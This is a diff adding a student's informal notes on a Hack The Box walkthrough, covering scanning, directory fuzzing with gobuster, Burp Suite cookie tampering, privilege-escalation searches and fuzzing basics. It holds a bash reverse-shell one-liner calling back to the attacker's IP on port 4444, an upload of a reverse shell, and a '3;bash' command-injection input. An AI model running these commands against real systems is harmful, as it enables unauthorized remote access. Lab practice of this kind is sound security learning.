@@ -1,0 +1,35 @@
+Jeff's hack the box walkthrough:
+- login
+- download config file
+- use openvpn
+
+
+ligolo : port forwarding when attacking networks
+
+
+nmap
+ping (ip)
+could try sshing,
+gobuster: learned that it's a php based site. 
+View src, search for href and src
+now doing burpsuite (might have to say http not https)
+--> login page does a POST
+change the cookie
+-- logged in, upload reverse shell
+ls -al *
+$conn = mysqli_connect(")
+--> hard-coded passwd
+
+big bash command, wikll need to replace w/ %20s and such
+bash -c "bash -i >&/dev/tcp/$my_ip/4444 0>&1"
+
+find / -group bugtracker
+find / -group bugtracker 2>/dev/null (fd 2 goes to trash)
+
+make terminal small, if goes out, can ! and run commands
+3;bash
+
+fuzzing: have a server, don't know what it will do, so throw a bunch at it (what gobuster does)
+    - ex. Online app: what input can you give it to make it crash
+    - gobuster: -x <php,txt,pdf> flag: try sticking php,txt, pdf at the end of everything
+
